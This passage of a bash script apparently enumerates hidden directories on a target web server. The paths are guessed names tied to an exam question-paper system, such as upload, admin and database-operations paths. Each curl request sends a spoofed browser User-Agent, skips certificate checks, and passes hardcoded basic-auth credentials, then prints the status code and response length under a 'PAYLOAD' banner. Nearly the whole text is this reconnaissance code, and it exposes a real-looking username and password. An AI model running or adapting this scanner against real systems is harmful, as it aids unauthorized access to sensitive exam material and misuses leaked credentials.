" "${target}QPBDataAutomationSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBDataAutomationSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabaseOps/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabaseOps/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabaseOps/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabaseFileUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabaseFileUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabaseFileUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystem-QPBatch/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystem-QPBatch/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystem-QPBatch/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaperHandlingModule/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaperHandlingModule/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaperHandlingModule/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData-Workflow/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData-Workflow/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData-Workflow/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile-Portal/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile-Portal/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile-Portal/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile-Uploader/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile-Uploader/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile-Uploader/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload-Admin/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload-Admin/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload-Admin/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader-ProcessingSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader-ProcessingSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader-ProcessingSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase-FileUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase-FileUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase-FileUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor-Sync/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor-Sync/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor-Sync/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase_Manager/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase_Manager/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase_Manager/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl-Control/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl-Control/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl-Control/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto-Module/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto-Module/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto-Module/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystem_Q_P/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystem_Q_P/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystem_Q_P/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessor_QPBFile/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessor_QPBFile/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessor_QPBFile/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ServiceQP/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ServiceQP/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ServiceQP/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipelineQPControl/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipelineQPControl/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipelineQPControl/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSync_QPCloud/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSync_QPCloud/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSync_QPCloud/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessorQPSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessorQPSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessorQPSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuiteQPBFile/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuiteQPBFile/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuiteQPBFile/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBDataAccessControl/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBDataAccessControl/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBDataAccessControl/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster_Service/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster_Service/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster_Service/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader-QPWorkflow/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader-QPWorkflow/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader-QPWorkflow/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSync_QsnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSync_QsnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSync_QsnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflowFileProcessor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflowFileProcessor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflowFileProcessor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatchMgmt/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatchMgmt/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatchMgmt/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AdminQPControl/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AdminQPControl/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AdminQPControl/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Platform_QstnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Platform_QstnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Platform_QstnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel_TestPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel_TestPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel_TestPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl_Admin/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl_Admin/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl_Admin/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk-FileProcessor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk-FileProcessor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk-FileProcessor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessing-TestPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessing-TestPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessing-TestPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessor_QPSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessor_QPSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessor_QPSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow-AutomationSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow-AutomationSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow-AutomationSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem-Admin/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem-Admin/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem-Admin/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc_CloudSync/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc_CloudSync/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc_CloudSync/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin_QPSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin_QPSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin_QPSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager_DataUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager_DataUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager_DataUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops-QPAuto/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops-QPAuto/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops-QPAuto/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SyncQPProcessing/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
